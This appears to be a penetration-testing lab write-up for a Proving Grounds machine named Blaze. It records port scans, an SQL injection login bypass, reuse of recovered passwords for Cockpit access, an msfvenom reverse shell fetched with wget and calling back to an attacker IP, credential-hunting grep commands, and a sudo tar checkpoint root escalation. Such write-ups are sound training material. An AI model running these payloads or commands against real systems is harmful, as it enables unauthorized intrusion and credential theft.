**Metadata**

- IP Address:  192.168.148.10
- Hostname: Blaze
- OS: 	
- Found Credentials/Users:
james / canttouchhhthiss@455152
cameron / thisscanttbetouchedd@455152

Main Objectives:

Local.txt = 28957ff5b811873b1444bad41b332252
Proof.txt = 4a971709b9ba0d78851818a46f35474f

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.10 -oN /home/kali/ProvingGround/Cockpit/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Cockpit/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 15:39 MST
Nmap scan report for 192.168.148.10
Host is up (0.082s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
9090/tcp open  http    Cockpit web service 198 - 220
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[+] Running: Nmap SCRIPTS TCP (open ports)
[+] Command: nmap -sS -Pn -n -p 22\,\ 80\,\ 9090 -sC -sV 192.168.148.10 -oN /home/kali/ProvingGround/Cockpit/nmap/scripts_tcp.nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 16:00 MST
Nmap scan report for 192.168.148.10
Host is up (0.079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.148.10:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 22, 80, 9090
[+] Open UDP ports (open only): <none>
```

3. SSH Enumeration

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
```

4. Web Enumeration  (Port 80)

```
Webserver Info - 
Running Applications - 
Site Visit - 
1. Found login page at 192.168.148.10/login.php
2. Put ' in as username and received SQL Error
3. Put ' -- - in as username and received access to admin dashbaord. 
   
whatweb -v http://target

[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.148.10:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Cockpit/gobuster/Cockpit_192.168.148.10_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.10:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 314] [--> http://192.168.148.10/css/]
/img                  (Status: 301) [Size: 314] [--> http://192.168.148.10/img/]
/index.html           (Status: 200) [Size: 3349]
/js                   (Status: 301) [Size: 313] [--> http://192.168.148.10/js/]
/server-status        (Status: 403) [Size: 279]
Progress: 4522 / 4613 (98.03%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.148.10:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Cockpit/gobuster/Cockpit_192.168.148.10_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.10:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,jsp,txt,bak,old,zip,tar.gz,php,asp,html,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blocked.html         (Status: 200) [Size: 233]
/css                  (Status: 301) [Size: 314] [--> http://192.168.148.10/css/]
/img                  (Status: 301) [Size: 314] [--> http://192.168.148.10/img/]
/index.html           (Status: 200) [Size: 3349]
/index.html           (Status: 200) [Size: 3349]
/js                   (Status: 301) [Size: 313] [--> http://192.168.148.10/js/]
/login.php            (Status: 200) [Size: 769]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 279]
Progress: 55255 / 55356 (99.82%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished



curl -i http://target

```

5. Web Enumeration  (Port 9090)

```
Webserver Info - 
Running Applications - 
Site Visit - 

whatweb -v http://target

[+] Running: Gobuster BASIC (9090) (exclude-length 43264)
[+] Command: gobuster dir -u http://192.168.148.10:9090 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Cockpit/gobuster/Cockpit_192.168.148.10_9090_dir_basic.txt --exclude-length 43264 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.10:9090
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          43264
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 9662]
/ping                 (Status: 200) [Size: 24]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished


curl -i http://target

```


6. Possible Exploits

```
1. MySQL SQLi in http://192.168.148.10/login.php
```

7. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- In put ' -- - as username and password as password and achieved login bypass. 

![[Pasted image 20260228171332.png]]

- Received access http://192.168.148.10/password-dashboard.php.

![[Pasted image 20260228171452.png]]

- Obtained both password using cyberchef.io. 

![[Pasted image 20260228171549.png]]

![[Pasted image 20260228171625.png]]

- Logged on using James account to https://192.168.148.10:9090/ and accessed terminal via Terminal option in Cockpit. 

![[Pasted image 20260228171804.png]]

2. Shell Upgrade

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=443 -f elf -o shell.elf

wget http://192.168.45.215/shell.elf
chmod +x shell.elf
./shell.elf

penelope -p 443
```

**Post-Exploitation**

1. Identify & System Info

```
whoami

id

hostname

pwd

uname -a

cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null

```

2. Environment

```
env

set 2>/dev/null | head -n 50

echo "$PATH"

echo "HOME=$HOME"; echo "SHELL=$SHELL"

```

3. User & Home Directories

```
cat /etc/passwd

ls -la /home

ls -la /root 2>/dev/null

sudo -l 2>/dev/null

sudo -V 2>/dev/null | head -n 10
```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50

find / -writable -type f 2>/dev/null | head -n 50

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50

ls -l /etc/passwd 2>/dev/null

ls -l /etc/shadow 2>/dev/null

ls -la / 2>/dev/null

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

getcap -r / 2>/dev/null

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null

ls -la /etc/cron.* 2>/dev/null

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null

grep -i docker /proc/1/cgroup 2>/dev/null
```

10. Automated Enumeration 

```


```

11. Possible PE Paths

```
Sudo version 1.8.31 
Vulnerable to CVE-2021-3560

tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                                                                                                                                  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33361         0.0.0.0:*               LISTEN      20121/cockpit-bridg 

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

/home/james/.bash_history


```

**Privilege Escalation**

1. PE Steps

- Since the James user can run the following sudo command, attempted to run additional tar options in order to receive root shell.

```
 (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

- Ran the following command (found on GTFO bins)

```
 sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Received root shell.

![[Pasted image 20260302134843.png]]

2. Notes

```

```

